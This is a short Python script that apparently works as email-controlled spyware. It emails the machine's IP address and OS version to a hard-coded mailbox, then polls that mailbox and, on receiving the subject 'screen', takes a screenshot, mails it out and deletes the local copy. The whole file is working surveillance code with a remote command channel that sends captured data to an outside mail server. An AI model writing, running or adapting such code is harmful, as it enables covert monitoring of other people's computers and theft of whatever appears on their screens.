import platform
import time
import os
import socket
import sys
import zmail
from PIL import ImageGrab

def getIP():
	ip = socket.gethostbyname(socket.gethostname())
	return ip

def getSystemVersion():
	return platform.platform()

def sendInformation(ip,systemVersion,emailName,password):
	info = 'ip:' + ip + "  " + 'system version:' + systemVersion
	print(info)
	mail_content = {
		'subject': 'information',
		'content_text': info
	}

	server = zmail.server(emailName,password)
	server.send_mail(emailName, mail_content)

def sendImg(pic_time,pic_name,emailName,password):
	mail_content = {
		'subject': pic_time,
		'headers':'screen capture',
		'attachments': pic_name
	}

	server = zmail.server(emailName,password)
	server.send_mail(emailName, mail_content)

def getInformation(emailName,password):
	server = zmail.server(emailName,password)
	mail = server.get_latest()
	subject = mail['subject']
	return subject

def screenCapture(emailName,password):
	pic_time = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
	pic_name = './' + 'screen' + pic_time + '.jpg'
	pic = ImageGrab.grab()
	pic.save('%s' % pic_name)
	print(pic_name + 'is saved')
	sendImg(pic_time,pic_name,emailName,password)
	print(pic_name + 'is removed')
	os.remove(pic_name)

if __name__ == '__main__':
	emailName = 'xxxx@sina.com'
	password = '******'
	sendInformation(getIP(),getSystemVersion(),emailName,password)
	while 1:
		if getInformation(emailName,password) == 'screen':
			screenCapture(emailName,password)